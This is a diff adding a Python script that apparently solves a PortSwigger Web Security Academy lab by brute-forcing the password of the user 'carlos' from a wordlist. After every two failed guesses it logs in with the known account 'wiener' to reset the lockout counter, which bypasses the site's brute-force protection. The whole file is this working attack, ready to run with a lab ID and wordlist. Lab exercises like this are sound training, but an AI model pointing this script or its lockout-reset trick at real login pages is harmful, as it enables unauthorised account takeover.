@@ -1,0 +1,48 @@
+import requests # Import the requests module to send requests
+
+labID = "labID_HERE" # Change this with your lab ID for portswigger
+url = f'https://{labID}.web-security-academy.net/login' # Construct the URL using the lab ID
+password_list = r"PASSWORDS_LIST" # Change this with your passwords wordlist file path
+
+def start():
+    n = 0 # Initialize a counter for failed attempts
+    
+    with open(password_list, 'r') as file: # Open the password list file in read mode
+        credential = file.readlines()
+
+    credential = [i.strip() for i in credential] # Remove any leading/trailing whitespace characters
+    
+    # Function to re-login after 2 failed attempts
+    def relogin():
+        nonlocal n # Use the nonlocal keyword to access the variable 'n' from the outer function
+        n = 0 # Reset the counter for failed attempts
+        
+        data = {
+            'username': 'wiener',
+            'password': 'peter'
+        }
+        # Send POST request to re-login
+        req = requests.post(url=url, data=data)
+        
+        print('## Re-login with Wiener successfully!') # Print success message for re-login
+    
+    # Loop through each password in the list
+    for p in credential:
+        data = {
+            'username': 'carlos',
+            'password': p
+        }
+
+        # Send POST request
+        req = requests.post(url=url, data=data)
+
+        # Check if the response contains any valid message
+        if "Your username is:" in req.text: # Check if the response contains a valid message
+            print(f'## {p} ==> Succeeded!##')
+            return  # Exit once credentials are found
+        else:
+            print(f'- {p} ==> Invalid') # Print invalid password message
+            n += 1 # Increment the counter for failed attempts
+            if n == 2: # If 2 failed attempts are made
+                relogin()  # Re-login after 2 failed attempts
+start() # Start the process
